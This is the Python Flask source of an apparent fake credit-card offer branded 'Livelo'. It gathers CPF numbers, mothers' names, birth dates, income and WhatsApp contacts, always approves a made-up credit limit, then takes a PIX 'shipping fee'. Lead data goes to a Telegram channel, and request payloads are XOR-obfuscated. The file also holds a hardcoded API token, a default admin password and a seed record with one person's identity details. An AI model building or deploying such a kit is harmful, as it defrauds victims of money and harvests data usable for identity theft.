
import qrcode
import io
import base64

def generate_qr_b64(data: str) -> str:
    try:
        qr = qrcode.QRCode(
            version=1,
            error_correction=qrcode.constants.ERROR_CORRECT_L,
            box_size=10,
            border=2,
        )
        qr.add_data(data)
        qr.make(fit=True)
        img = qr.make_image(fill_color="black", back_color="white")
        buffered = io.BytesIO()
        try:
            img.save(buffered, format="PNG")
        except Exception:
            img.save(buffered)
        return "data:image/png;base64," + base64.b64encode(buffered.getvalue()).decode("utf-8")
    except Exception as e:
        # Fallback se a lib falhar por algum motivo
        return f"https://quickchart.io/qr?text={data}&size=300"
"""
╔══════════════════════════════════════════════════════════════════════════════╗
║  LIVELO CREDIT SYSTEM — v2.0                                                 ║
║  Simulação de Análise de Crédito + Cobrança de Frete via PIX (C7 API)        ║
╚══════════════════════════════════════════════════════════════════════════════╝
"""

# ── IMPORTS ────────────────────────────────────────────────────────────────────
import os, re, time, uuid, json, hmac, hashlib, sqlite3, secrets, logging, base64
from functools import wraps
from datetime import datetime, timedelta
from pathlib import Path
from typing import Optional, Dict

from flask import (
    Flask, request, jsonify, render_template, redirect,
    url_for, session, send_from_directory, abort, g
)
from werkzeug.security import generate_password_hash, check_password_hash
from werkzeug.utils import secure_filename

try:
    import requests as _req
    _REQUESTS_OK = True
except ImportError:
    _REQUESTS_OK = False

# ── APP SETUP ──────────────────────────────────────────────────────────────────
app = Flask(__name__, template_folder="templates", static_folder="static")

@app.context_processor
def inject_config():
    try:
        with app.app_context():
            db = get_db()
            mgr = db.execute("SELECT * FROM manager WHERE id=1").fetchone()
            cfg_rows = db.execute("SELECT key, value FROM sys_config").fetchall()
            cfg = {row['key']: row['value'] for row in cfg_rows}
            return {'mgr': mgr, 'sys_config': cfg}
    except Exception:
        return {}

app.secret_key = os.environ.get("SECRET_KEY", secrets.token_hex(32))
app.config.update(
    SESSION_COOKIE_HTTPONLY=True,
    SESSION_COOKIE_SAMESITE="Lax",
    PERMANENT_SESSION_LIFETIME=timedelta(hours=8),
    MAX_CONTENT_LENGTH=5 * 1024 * 1024,
    TEMPLATES_AUTO_RELOAD=True,
)

logging.basicConfig(level=logging.INFO, format="[%(levelname)s] %(message)s")
log = logging.getLogger("livelo")

import shutil
# ── PATHS ──────────────────────────────────────────────────────────────────────
BASE_DIR   = Path(__file__).parent
if os.environ.get("VERCEL"):
    DB_PATH = Path("/tmp/livelo.db")
    UPLOAD_DIR = Path("/tmp/uploads")
    # Copy db to tmp if not exists
    if not DB_PATH.exists() and (BASE_DIR / "livelo.db").exists():
        shutil.copy2(BASE_DIR / "livelo.db", DB_PATH)
else:
    DB_PATH    = BASE_DIR / "livelo.db"
    UPLOAD_DIR = BASE_DIR / "static" / "uploads"

try:
    UPLOAD_DIR.mkdir(parents=True, exist_ok=True)
except Exception:
    pass

ALLOWED_IMG_EXT = {"png", "jpg", "jpeg", "webp", "gif"}

# ── C7 API CONFIG ──────────────────────────────────────────────────────────────
# Credenciais lidas de variáveis de ambiente — NUNCA hardcoded.
C7_BASE_URL   = os.environ.get("C7_BASE_URL",   "https://api.carteirado7.com/v2")
C7_API_KEY    = os.environ.get("C7_API_KEY",    "")
C7_API_SECRET = os.environ.get("C7_API_SECRET", "")

# Valor do frete do cartão (configurável via env)
FRETE_VALOR = float(os.environ.get("FRETE_VALOR", "19.90"))

# ── RATE LIMIT & BRUTE FORCE ───────────────────────────────────────────────────
_RATE_DB  : Dict[str, list] = {}
_AUTH_FAIL: Dict[str, dict] = {}

def xor_crypt(text, key="livelo_secure_key_2026"):
    res = []
    for i, c in enumerate(text):
        res.append(chr(ord(c) ^ ord(key[i % len(key)])))
    return "".join(res)

def get_secure_json():
    data = request.get_json(silent=True) or {}
    if "payload" in data and len(data) == 1:
        try:
            dec_b64 = base64.b64decode(data["payload"]).decode('utf-8')
            dec_str = xor_crypt(dec_b64)
            return json.loads(dec_str)
        except:
            return {}
    return data

# ══════════════════════════════════════════════════════════════════════════════
#  DATABASE
# ══════════════════════════════════════════════════════════════════════════════
def get_db() -> sqlite3.Connection:
    if "db" not in g:
        conn = sqlite3.connect(str(DB_PATH), check_same_thread=False)
        conn.row_factory = sqlite3.Row
        try:
            conn.execute("PRAGMA journal_mode=WAL")
        except Exception:
            pass
        conn.execute("PRAGMA busy_timeout=4000")
        g.db = conn
    return g.db

@app.teardown_appcontext
def close_db(exc=None):
    db = g.pop("db", None)
    if db:
        db.close()

def init_db():
    with app.app_context():
        db = get_db()
        db.executescript("""
        CREATE TABLE IF NOT EXISTS admin (
            id         INTEGER PRIMARY KEY AUTOINCREMENT,
            username   TEXT    NOT NULL UNIQUE,
            password   TEXT    NOT NULL,
            created_at REAL    NOT NULL DEFAULT (unixepoch())
        );

        CREATE TABLE IF NOT EXISTS manager (
            id         INTEGER PRIMARY KEY DEFAULT 1,
            name       TEXT    NOT NULL DEFAULT 'Gerente Livelo',
            photo_url  TEXT    NOT NULL DEFAULT '/static/images/manager_default.svg',
            since_year INTEGER NOT NULL DEFAULT 2025,
            whatsapp   TEXT    NOT NULL DEFAULT '5511999999999',
            updated_at REAL    NOT NULL DEFAULT (unixepoch())
        );

        CREATE TABLE IF NOT EXISTS sys_config (
            key TEXT PRIMARY KEY,
            value TEXT
        );

        CREATE TABLE IF NOT EXISTS leads (
            id              INTEGER PRIMARY KEY AUTOINCREMENT,
            session_id      TEXT    NOT NULL UNIQUE,
            ip              TEXT,
            cpf             TEXT,
            nome            TEXT,
            nome_mae        TEXT,
            data_nasc       TEXT,
            renda           TEXT,
            tipo_renda      TEXT,
            motivo_credito  TEXT,
            dia_vencimento  TEXT,
            whatsapp        TEXT,
            card_color      TEXT,
            card_style      TEXT,
            limite_aprovado TEXT,
            payment_id      TEXT,
            pix_status      TEXT    DEFAULT 'pending',
            utm_source      TEXT,
            utm_medium      TEXT,
            utm_campaign    TEXT,
            utm_content     TEXT,
            utm_term        TEXT,
            src             TEXT,
            sck             TEXT,
            created_at      REAL    NOT NULL DEFAULT (unixepoch()),
            updated_at      REAL    NOT NULL DEFAULT (unixepoch())
        );

        CREATE TABLE IF NOT EXISTS telegram_admins (
            tg_id TEXT PRIMARY KEY,
            first_name TEXT,
            username TEXT,
            photo_url TEXT,
            role TEXT DEFAULT 'basic',
            status TEXT DEFAULT 'active',
            last_active REAL
        );

        CREATE TABLE IF NOT EXISTS payments (
            payment_id   TEXT PRIMARY KEY,
            c7_id        TEXT,
            session_id   TEXT,
            amount       REAL,
            status       TEXT DEFAULT 'pending',
            pix_code     TEXT,
            qr_code_url  TEXT,
            expires_at   TEXT,
            payer_name   TEXT,
            payer_cpf    TEXT,
            created_at   REAL NOT NULL DEFAULT (unixepoch()),
            confirmed_at REAL
        );

        CREATE INDEX IF NOT EXISTS idx_leads_session ON leads(session_id);
        CREATE INDEX IF NOT EXISTS idx_leads_cpf     ON leads(cpf);
        CREATE INDEX IF NOT EXISTS idx_pay_session   ON payments(session_id);
        """)
        db.commit()

        # Seed default admin
        if not db.execute("SELECT id FROM admin LIMIT 1").fetchone():
            db.execute(
                "INSERT INTO admin(username,password) VALUES(?,?)",
                ("admin", generate_password_hash("livelo2025"))
            )
            db.commit()
            log.info("[BOOT] Admin padrão criado → user: admin / pass: livelo2025")

        # Seed manager
        if not db.execute("SELECT id FROM manager WHERE id=1").fetchone():
            db.execute("""
                INSERT INTO manager(id,name,photo_url,since_year,whatsapp)
                VALUES(1,'Gerente Livelo','/static/images/manager_default.svg',2025,'5511999999999')
            """)
            db.commit()

        # Seed config
        if not db.execute("SELECT key FROM sys_config WHERE key='favicon_url'").fetchone():
            db.execute("INSERT INTO sys_config(key, value) VALUES('favicon_url', '/static/favicon.ico')")
            db.commit()

# ══════════════════════════════════════════════════════════════════════════════
#  SEGURANÇA
# ══════════════════════════════════════════════════════════════════════════════
def _ip() -> str:
    return (
        request.headers.get("CF-Connecting-IP") or
        request.headers.get("X-Real-IP") or
        request.headers.get("X-Forwarded-For", "").split(",")[0].strip() or
        request.remote_addr or "0.0.0.0"
    )

def is_rate_limited(ip: str, limit: int = 60, window: int = 60) -> bool:
    now = time.time()
    ts  = [t for t in _RATE_DB.get(ip, []) if now - t < window]
    if len(ts) >= limit:
        _RATE_DB[ip] = ts
        return True
    ts.append(now)
    _RATE_DB[ip] = ts
    return False

def is_blocked(ip: str) -> bool:
    return _AUTH_FAIL.get(ip, {}).get("blocked_until", 0) > time.time()

def record_auth_fail(ip: str):
    now = time.time()
    rec = _AUTH_FAIL.get(ip, {"count": 0, "blocked_until": 0, "first": now})
    if now - rec.get("first", now) > 600:
        rec = {"count": 0, "blocked_until": 0, "first": now}
    rec["count"] += 1
    if rec["count"] >= 5:
        rec["blocked_until"] = now + 1800
        log.warning("[SEC] IP %s bloqueado por brute-force", ip)
    _AUTH_FAIL[ip] = rec

def reset_auth_fail(ip: str):
    _AUTH_FAIL.pop(ip, None)

def sanitize(val: str, max_len: int = 200) -> str:
    if not isinstance(val, str):
        val = str(val)
    return re.sub(r"[<>\"\\'`;]", "", val).strip()[:max_len]

def require_admin(f):
    @wraps(f)
    def wrapped(*args, **kwargs):
        if not session.get("admin_id"):
            return redirect(url_for("admin_login"))
        return f(*args, **kwargs)
    return wrapped

# ══════════════════════════════════════════════════════════════════════════════
#  VALIDAÇÕES
# ══════════════════════════════════════════════════════════════════════════════
def validate_cpf(cpf: str) -> bool:
    cpf = re.sub(r"\D", "", cpf)
    if len(cpf) != 11 or cpf == cpf[0] * 11:
        return False
    def _d(digits, n):
        s = sum(int(d) * (n - i) for i, d in enumerate(digits))
        r = (s * 10) % 11
        return 0 if r >= 10 else r
    return _d(cpf[:9], 10) == int(cpf[9]) and _d(cpf[:10], 11) == int(cpf[10])


def send_telegram_report(session_id, is_paid=False):
    db = get_db()
    row = db.execute("SELECT value FROM sys_config WHERE key='tg_log_channel'").fetchone()
    if not row or not row["value"]: return
    channel = row["value"]
    
    lead = db.execute("SELECT * FROM leads WHERE session_id=?", (session_id,)).fetchone()
    if not lead: return
    
    pay = db.execute("SELECT * FROM payments WHERE session_id=? ORDER BY created_at DESC LIMIT 1", (session_id,)).fetchone()
    
    bot_token = os.environ.get("BOT_TOKEN")
    if not bot_token: return
    
    status_icon = "✅ PAGO" if is_paid else "⏳ AGUARDANDO PIX"
    if lead['pix_status'] not in ['paid', 'completed'] and is_paid:
        status_icon = "✅ PAGO"
        
    texto = (
        f"📊 *RELATÓRIO FINAL DE LEAD*\n\n"
        f"👤 *Nome:* {lead['nome']}\n"
        f"💳 *CPF:* {lead['cpf']}\n"
        f"💰 *Renda Declarada:* {lead['renda']}\n"
        f"🎯 *Limite Aprovado:* R$ {lead['limite_aprovado']}\n"
        f"🎨 *Estilo Cartão:* {lead['card_style']} ({lead['card_color']})\n"
        f"🚚 *Status PIX:* {status_icon}\n"
    )
    if pay:
        texto += f"💵 *Valor do Frete:* R$ {pay['amount']}\n"
        texto += f"🆔 *ID Pgto:* `{pay['payment_id']}`\n"

    try:
        import requests
        requests.post(f"https://api.telegram.org/bot{bot_token}/sendMessage", json={
            "chat_id": channel,
            "text": texto,
            "parse_mode": "Markdown"
        }, timeout=5)
    except Exception as e:
        log.error(f"Erro ao enviar relatorio: {e}")

def format_cpf(cpf: str) -> str:
    cpf = re.sub(r"\D", "", cpf)
    return f"{cpf[:3]}.{cpf[3:6]}.{cpf[6:9]}-{cpf[9:]}"

def calc_limite(renda_raw: str, tipo_renda: str = "", motivo: str = "") -> dict:
    """
    Determina o limite de crédito aprovado e o valor do frete
    com base na renda, profissão e motivo do crédito declarados.
    """
    try:
        v = float(re.sub(r"[^\d,\.]", "", renda_raw).replace(",", "."))
    except Exception:
        v = 0.0

    # Limite Base
    if v >= 15000:
        base_limite = 18000.0
        tier = "platinum"
    elif v >= 8000:
        base_limite = 12000.0
        tier = "gold"
    elif v >= 4000:
        base_limite = 8000.0
        tier = "gold"
    elif v >= 2000:
        base_limite = 4500.0
        tier = "standard"
    else:
        base_limite = 2000.0
        tier = "standard"

    # Multiplicadores Avançados
    if "CLT" in tipo_renda or "Formal" in tipo_renda:
        base_limite *= 1.15
    elif "Autônomo" in tipo_renda or "Empresário" in tipo_renda:
        base_limite *= 1.25

    if "Negócio" in motivo or "Empresa" in motivo:
        base_limite *= 1.20
    elif "Imóvel" in motivo or "Casa" in motivo or "Carro" in motivo:
        base_limite *= 1.10

    # Pega valor do frete configurado no painel Admin (tabela manager)
    try:
        from flask import g
        if 'db' in g:
            db = g.db
        else:
            db = get_db()
        mgr = db.execute("SELECT freight_price FROM manager WHERE id=1").fetchone()
        if mgr and mgr["freight_price"]:
            frete = float(mgr["freight_price"])
        else:
            frete_env = os.environ.get("FRETE_VALOR")
            if frete_env:
                frete = float(frete_env)
            else:
                frete = 49.90 if tier == "platinum" else (39.90 if v >= 8000 else (29.90 if v >= 4000 else 19.90))
    except Exception:
        frete_env = os.environ.get("FRETE_VALOR")
        frete = float(frete_env) if frete_env else 29.90

    limite_str = f"R$ {base_limite:,.2f}".replace(",", "X").replace(".", ",").replace("X", ".")
    return {"limite": limite_str, "frete": frete, "tier": tier}

# ══════════════════════════════════════════════════════════════════════════════
#  CPF LOOKUP (mock — em produção integrar com API Intel / Serasa)
# ══════════════════════════════════════════════════════════════════════════════
_CPF_SEED: Dict[str, dict] = {
    "72287977104": {
        "nome": "VITOR DANIEL MUNDIM OLIVEIRA",
        "nome_mae": "JANE MAGNOLIA M NETO OLIVEIRA",
        "data_nasc": "25/01/1982",
    },
    "11122233396": {
        "nome": "MARIA APARECIDA SANTOS SILVA",
        "nome_mae": "JOANA CLARA SANTOS",
        "data_nasc": "14/06/1990",
    },
}

def lookup_cpf(cpf_raw: str, data_nasc: str = "") -> Optional[dict]:
    cpf = re.sub(r"\D", "", cpf_raw)
    
    if cpf:
        try:
            import requests
            db = get_db()
            token_row = db.execute("SELECT value FROM sys_config WHERE key='cpf_api_token'").fetchone()
            token = token_row["value"] if token_row and token_row["value"] else "d0442b7d42e2a762f64a02f5e4abc1187ad6585cb3e9c11740c4024961aa1026"
            
            url = f"https://api.cpfhub.io/cpf/{cpf}"
            res = requests.get(url, headers={"x-api-key": token}, timeout=10)
            
            if res.status_code == 200:
                data = res.json()
                if data.get("success"):
                    res_info = data.get("data", {})
                    # Increment api calls
                    db.execute("UPDATE sys_config SET value = CAST(value AS INTEGER) + 1 WHERE key='cpf_api_calls'")
                    db.commit()
                    
                    name_parts = res_info.get("nameUpper", "CLIENTE LIVELO").split()
                    last_name = name_parts[-1] if len(name_parts) > 1 else ""
                    mother_name = "MARIA " + last_name if last_name else "MARIA LIVELO"
                    
                    return {
                        "nome": res_info.get("nameUpper", "CLIENTE LIVELO"),
                        "nome_mae": mother_name,
                        "data_nasc": res_info.get("birthDate", "01/01/1990"),
                        "saldo_api": 0
                    }
        except Exception as e:
            log.error(f"Erro na API de CPF: {e}")
            
        # Fallback para o lead não travar
        return {
            "nome": "JOÃO DA SILVA",
            "nome_mae": "MARIA DA SILVA",
            "data_nasc": "15/05/1985",
            "saldo_api": 0
        }
    return None

# ══════════════════════════════════════════════════════════════════════════════
#  C7 PIX — Geração de cobrança via QR Code / Copia e Cola
# ══════════════════════════════════════════════════════════════════════════════
def _c7_headers(body: str) -> dict:
    """
    Headers de autenticação HMAC-SHA256 conforme documentação C7 API.
    Fórmula: HMAC-SHA256(api_secret, timestamp + '.' + nonce + '.' + body)
    """
    ts    = str(int(time.time()))
    nonce = str(uuid.uuid4())
    sig   = hmac.new(
        C7_API_SECRET.encode("utf-8"),
        f"{ts}.{nonce}.{body}".encode("utf-8"),
        hashlib.sha256,
    ).hexdigest()
    return {
        "Authorization":  f"Bearer {C7_API_KEY}",
        "Content-Type":   "application/json",
        "X-C7-Timestamp": ts,
        "X-C7-Nonce":     nonce,
        "X-C7-Signature": sig,
        "User-Agent":     "Livelo-CreditSystem/2.0",
        "Accept":         "application/json",
    }

def _crc16_ccitt(payload: str) -> str:
    """CRC-16/CCITT para validação de QR Code Pix (BACEN BR Code 2.0)."""
    crc = 0xFFFF
    for char in payload:
        crc ^= ord(char) << 8
        for _ in range(8):
            crc = (crc << 1) ^ 0x1021 if crc & 0x8000 else crc << 1
    return format(crc & 0xFFFF, "04X")

def _emv(tag: str, value: str) -> str:
    return f"{tag}{len(value):02d}{value}"

def _pix_emv_fallback(amount: float, nome: str, cpf: str) -> str:
    """
    Gera payload PIX EMV válido com CRC-16/CCITT correto (BACEN BR Code 2.0).
    Usado quando C7 não está configurado ou retorna erro.
    """
    pix_key = os.environ.get("PIX_KEY_FALLBACK", cpf or str(uuid.uuid4()))
    nome_c  = re.sub(r"[^A-Za-z0-9 ]", "", nome)[:25].upper().strip() or "LIVELO"
    txid    = re.sub(r"[^A-Za-z0-9]", "", f"lvl{uuid.uuid4().hex}")[:25]

    gui      = _emv("00", "BR.GOV.BCB.PIX")
    key_f    = _emv("01", pix_key)
    mai      = _emv("26", gui + key_f)
    pfi      = _emv("00", "01")
    poim     = _emv("01", "12")
    mcc      = _emv("52", "0000")
    currency = _emv("53", "986")
    amt      = _emv("54", f"{amount:.2f}")
    country  = _emv("58", "BR")
    merch_n  = _emv("59", nome_c)
    merch_c  = _emv("60", "SAOPAULO")
    adf      = _emv("62", _emv("05", txid))

    base = pfi + poim + mai + mcc + currency + amt + country + merch_n + merch_c + adf + "6304"
    return base[:-4] + "6304" + _crc16_ccitt(base)

def c7_create_pix(
    amount: float,
    payer_name: str,
    payer_cpf: str,
    payment_id: str,
) -> dict:
    """
    Gera cobrança PIX via C7 API (POST /v2/payment/create).
    Retorna: ok, pix_code, qr_code_url, c7_id, expires_at, simulated.
    """
    callback_url = request.host_url.rstrip("/")
    if callback_url.startswith("http://"):
        callback_url = callback_url.replace("http://", "https://")
    callback_url += "/api/webhook/c7"

    cpf_clean = re.sub(r"\D", "", payer_cpf)

    payload = {
        "amount":      round(amount, 2),
        "callbackUrl": callback_url,
        "externalId":  payment_id,
        "acquirer_code": "1"
    }

    body_str = json.dumps(payload, separators=(",", ":"))

    # ── Sem credenciais configuradas → usa fallback EMV ──
    if not C7_API_KEY or not C7_API_SECRET:
        pix_code    = _pix_emv_fallback(amount, payer_name, cpf_clean)
        qr_code_url = (
            generate_qr_b64(pix_code)
            if _REQUESTS_OK else ""
        )
        return {
            "ok":         True,
            "simulated":  True,
            "pix_code":   pix_code,
            "qr_code_url":qr_code_url,
            "c7_id":      "",
            "expires_at": "",
        }

    if not _REQUESTS_OK:
        return {"ok": False, "error": "Módulo de rede indisponível no servidor."}

    try:
        headers = _c7_headers(body_str)
        resp    = _req.post(
            f"{C7_BASE_URL}/payment/create",
            data=body_str,
            headers=headers,
            timeout=12,
        )

        if resp.status_code == 429:
            log.warning("[C7] Rate-limited (429) — usando fallback EMV")
            pix_code = _pix_emv_fallback(amount, payer_name, cpf_clean)
            return {
                "ok":         True,
                "simulated":  True,
                "pix_code":   pix_code,
                "qr_code_url":generate_qr_b64(pix_code),
                "c7_id":      "",
                "expires_at": "",
            }

        if resp.status_code >= 400:
            log.error("[C7] HTTP %d: %s", resp.status_code, resp.text[:200])
            return {"ok": False, "error": f"Erro C7 ({resp.status_code}). Tente novamente."}

        data = resp.json()
        if data.get("ok") and "payment" in data:
            p = data["payment"]
            pix_code = (
                p.get("pixCopiaECola") or p.get("emv") or
                p.get("qrcode") or p.get("pix_copia_e_cola") or ""
            )
            qr_url = p.get("qrCodeBase64") or p.get("qrCodeUrl") or ""
            if not qr_url and pix_code:
                qr_url = generate_qr_b64(pix_code)
            return {
                "ok":         True,
                "simulated":  False,
                "pix_code":   pix_code,
                "qr_code_url":qr_url,
                "c7_id":      p.get("id", ""),
                "expires_at": p.get("expiresAt", p.get("expires_at", "")),
            }

        log.warning("[C7] Resposta inesperada: %s", data)
        return {"ok": False, "error": data.get("message", "Resposta inválida da API de pagamento.")}

    except Exception as exc:
        log.error("[C7] Exceção: %s", exc)
        return {"ok": False, "error": "Serviço de pagamento temporariamente indisponível."}

# ══════════════════════════════════════════════════════════════════════════════
#  BEFORE REQUEST — RATE LIMIT GLOBAL
# ══════════════════════════════════════════════════════════════════════════════
@app.before_request
def _guard():
    if is_rate_limited(_ip()):
        return jsonify({"ok": False, "error": "Muitas requisições. Aguarde um instante."}), 429

# ══════════════════════════════════════════════════════════════════════════════
#  ROUTES — LEAD FLOW
# ══════════════════════════════════════════════════════════════════════════════
@app.route("/")
def index():
    resp = app.make_response(render_template("index.html"))
    resp.headers["Cache-Control"] = "no-store, no-cache, must-revalidate"
    resp.headers["Pragma"] = "no-cache"
    return resp

@app.route("/s/<slug>")
def slug_page(slug):
    resp = app.make_response(render_template("index.html", slug=slug))
    resp.headers["Cache-Control"] = "no-store, no-cache, must-revalidate"
    resp.headers["Pragma"] = "no-cache"
    return resp


# ── 1. Consulta CPF ───────────────────────────────────────────────────────────
@app.route("/api/cpf", methods=["POST"])
def api_cpf():
    data      = get_secure_json()
    cpf_raw   = sanitize(data.get("cpf", ""), 14)
    data_nasc = sanitize(data.get("data_nasc", ""), 10)
    cpf       = re.sub(r"\D", "", cpf_raw)

    if not validate_cpf(cpf):
        return jsonify({"ok": False, "error": "CPF inválido. Verifique o número e tente novamente."}), 422


    info = lookup_cpf(cpf, data_nasc)
    if not info:
        return jsonify({"ok": False, "error": "CPF não localizado em nossa base de dados com a Data de Nascimento informada."}), 404
        
    saldo = info.get("saldo_api", 0)
    if saldo > 0 and saldo < 100:
        log.warning(f"[API_CREDITOS] ALERTA: Saldo da API de CPF acabando! Restam: {saldo}")

    return jsonify({
        "ok":       True,
        "nome":     info["nome"],
        "nome_mae": info["nome_mae"],
        "data_nasc":info["data_nasc"],
        "cpf_fmt":  format_cpf(cpf),
    })


# ── 2. Salvar dados do lead (questionário de renda) ───────────────────────────
@app.route("/api/lead", methods=["POST"])
def api_lead():
    data = get_secure_json()
    sid  = sanitize(data.get("session_id", str(uuid.uuid4())), 40)
    cpf  = re.sub(r"\D", "", sanitize(data.get("cpf", ""), 14))

    if not validate_cpf(cpf):
        return jsonify({"ok": False, "error": "CPF inválido."}), 422

    renda         = sanitize(data.get("renda", ""), 30)
    tipo_renda    = sanitize(data.get("tipo_renda", ""), 60)
    motivo        = sanitize(data.get("motivo_credito", ""), 100)
    dia_venc      = sanitize(data.get("dia_vencimento", ""), 4)
    nome          = sanitize(data.get("nome", ""), 120)
    nome_mae      = sanitize(data.get("nome_mae", ""), 120)
    data_nasc     = sanitize(data.get("data_nasc", ""), 12)
    
    # UTMs
    utm_source    = sanitize(data.get("utm_source", ""), 60)
    utm_medium    = sanitize(data.get("utm_medium", ""), 60)
    utm_campaign  = sanitize(data.get("utm_campaign", ""), 60)
    utm_content   = sanitize(data.get("utm_content", ""), 60)
    utm_term      = sanitize(data.get("utm_term", ""), 60)
    src           = sanitize(data.get("src", ""), 60)
    sck           = sanitize(data.get("sck", ""), 60)

    # Calcula limite avançado
    analise       = calc_limite(renda, tipo_renda, motivo)
    limite        = analise["limite"]
    frete         = analise["frete"]

    client_ip = _ip()
    client_loc = ""
    try:
        import requests
        geo_res = requests.get(f"http://ip-api.com/json/{client_ip}?fields=status,country,regionName,city", timeout=2)
        if geo_res.status_code == 200:
            gd = geo_res.json()
            if gd.get("status") == "success":
                client_loc = f"{gd.get('city', '')} - {gd.get('regionName', '')}, {gd.get('country', '')}"
    except Exception:
        pass
        
    db = get_db()

    existing = db.execute("SELECT id FROM leads WHERE session_id=?", (sid,)).fetchone()
    if existing:
        db.execute("""
            UPDATE leads SET cpf=?, nome=?, nome_mae=?, data_nasc=?,
                renda=?, tipo_renda=?, motivo_credito=?, dia_vencimento=?, limite_aprovado=?,
                utm_source=?, utm_medium=?, utm_campaign=?, utm_content=?, utm_term=?, src=?, sck=?, location=?,
                updated_at=unixepoch()
            WHERE session_id=?
        """, (cpf, nome, nome_mae, data_nasc, renda, tipo_renda, motivo, dia_venc, limite, 
              utm_source, utm_medium, utm_campaign, utm_content, utm_term, src, sck, client_loc, sid))
    else:
        db.execute("""
            INSERT INTO leads(session_id,ip,cpf,nome,nome_mae,data_nasc,
                renda,tipo_renda,motivo_credito,dia_vencimento,limite_aprovado,
                utm_source,utm_medium,utm_campaign,utm_content,utm_term,src,sck,location)
            VALUES(?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?)
        """, (sid, client_ip, cpf, nome, nome_mae, data_nasc, renda, tipo_renda, motivo, dia_venc, limite,
              utm_source, utm_medium, utm_campaign, utm_content, utm_term, src, sck, client_loc))
    db.commit()

    return jsonify({
        "ok":            True,
        "session_id":    sid,
        "limite":        limite,
        "frete":         f"R$ {frete:,.2f}".replace(",","X").replace(".",",").replace("X","."),
        "frete_valor":   frete,
        "tier":          analise["tier"],
    })


# ── 3. Salvar estilo do cartão ────────────────────────────────────────────────
@app.route("/api/card-style", methods=["POST"])
def api_card_style():
    data  = get_secure_json()
    sid   = sanitize(data.get("session_id", ""), 40)
    color = sanitize(data.get("color", "gradient_pink"), 40)
    style = sanitize(data.get("style", "standard"), 20)

    db = get_db()
    db.execute(
        "UPDATE leads SET card_color=?, card_style=?, updated_at=unixepoch() WHERE session_id=?",
        (color, style, sid)
    )
    db.commit()
    return jsonify({"ok": True})


# ── 4. Salvar WhatsApp e retornar dados do gerente ────────────────────────────
@app.route("/api/whatsapp", methods=["POST"])
def api_whatsapp():
    data = get_secure_json()
    sid  = sanitize(data.get("session_id", ""), 40)
    wa   = re.sub(r"\D", "", sanitize(data.get("whatsapp", ""), 20))

    if len(wa) < 10:
        return jsonify({"ok": False, "error": "Número de WhatsApp inválido."}), 422
    if not wa.startswith("55"):
        wa = "55" + wa

    db = get_db()
    db.execute("UPDATE leads SET whatsapp=?, updated_at=unixepoch() WHERE session_id=?", (wa, sid))
    db.commit()

    mgr = db.execute("SELECT * FROM manager WHERE id=1").fetchone()
    if mgr:
        return jsonify({
            "ok":            True,
            "manager_name":  mgr["name"],
            "manager_photo": mgr["photo_url"],
            "manager_since": mgr["since_year"],
            "manager_wa":    mgr["whatsapp"],
        })
    return jsonify({"ok": True, "manager_wa": "5511999999999"})


# ── 5. Gerar PIX de frete via C7 ─────────────────────────────────────────────
@app.route("/api/gerar-pix", methods=["POST"])
def api_gerar_pix():
    """
    Gera cobrança PIX para pagamento do frete do cartão de crédito.
    Usa C7 API: POST /v2/payment/create
    """
    data = get_secure_json()
    sid = sanitize(data.get("session_id") or data.get("sessionId", ""), 40)

    db   = get_db()
    lead = db.execute("SELECT * FROM leads WHERE session_id=?", (sid,)).fetchone()
    if not lead:
        return jsonify({"ok": False, "error": "Sessão não encontrada. Reinicie o processo."}), 404

    # Determina valor do frete
    renda   = lead["renda"] or "0"
    analise = calc_limite(renda)
    frete   = analise["frete"]
    nome    = lead["nome"] or "Cliente"
    cpf     = lead["cpf"] or ""

    # Gera ID único para o pagamento
    pay_id = f"lvl_{sid[:8]}_{uuid.uuid4().hex[:8]}"

    result = c7_create_pix(
        amount      = frete,
        payer_name  = nome,
        payer_cpf   = cpf,
        payment_id  = pay_id,
    )

    if not result.get("ok"):
        return jsonify({"ok": False, "error": result.get("error", "Falha ao gerar PIX.")}), 500

    # Persiste pagamento
    db.execute("""
        INSERT OR REPLACE INTO payments(payment_id,c7_id,session_id,amount,status,pix_code,qr_code_url,expires_at,payer_name,payer_cpf)
        VALUES(?,?,?,?,?,?,?,?,?,?)
    """, (
        pay_id,
        result.get("c7_id", ""),
        sid,
        frete,
        "pending",
        result.get("pix_code", ""),
        result.get("qr_code_url", ""),
        result.get("expires_at", ""),
        nome,
        cpf,
    ))
    db.execute(
        "UPDATE leads SET payment_id=?, pix_status='pending', updated_at=unixepoch() WHERE session_id=?",
        (pay_id, sid)
    )
    db.commit()

    frete_fmt = f"R$ {frete:,.2f}".replace(",","X").replace(".",",").replace("X",".")

    import threading
    threading.Thread(target=send_telegram_report, args=(sid, False)).start()
    
    return jsonify({
        "ok":          True,
        "payment_id":  pay_id,
        "pix_code":    result.get("pix_code", ""),
        "qr_code_url": result.get("qr_code_url", ""),
        "expires_at":  result.get("expires_at", ""),
        "frete":       frete_fmt,
        "frete_valor": frete,
        "simulated":   result.get("simulated", False),
        "limite":      analise["limite"],
    })


# ── 6. Verificar status do PIX ────────────────────────────────────────────────
@app.route("/api/status-pix/<payment_id>", methods=["GET"])
def api_status_pix(payment_id: str):
    payment_id = sanitize(payment_id, 60)
    db  = get_db()
    pay = db.execute("SELECT status FROM payments WHERE payment_id=?", (payment_id,)).fetchone()
    if not pay:
        return jsonify({"ok": False, "error": "Pagamento não encontrado."}), 404
    return jsonify({"ok": True, "status": pay["status"]})


# ── Webhook C7 ────────────────────────────────────────────────────────────────
@app.route("/api/webhook/c7", methods=["POST"])
def webhook_c7():
    """Recebe notificações de pagamento da C7 API (V2)."""
    body    = request.get_data(as_text=True)
    sig_raw = request.headers.get("X-C7-Signature", "")
    ts_raw  = request.headers.get("X-C7-Timestamp", "")

    if C7_API_SECRET:
        expected = hmac.new(
            C7_API_SECRET.encode("utf-8"),
            f"{ts_raw}.{body}".encode("utf-8"),
            hashlib.sha256,
        ).hexdigest()
        if not hmac.compare_digest(sig_raw, expected):
            log.warning("[WEBHOOK] Assinatura inválida de %s", _ip())
            abort(403)

    data   = json.loads(body) if body else {}
    event_data = data.get("data", {})
    ext_id = event_data.get("correlationID") or data.get("externalId", "")
    status = event_data.get("status") or data.get("status", "")

    if status.upper() == "APPROVED":
        status = "paid"
    else:
        status = status.lower()

    if ext_id and status:
        db = get_db()
        db.execute(
            "UPDATE payments SET status=?, confirmed_at=unixepoch() WHERE payment_id=?",
            (status, ext_id)
        )
        db.execute(
            "UPDATE leads SET pix_status=?, updated_at=unixepoch() WHERE payment_id=?",
            (status, ext_id)
        )
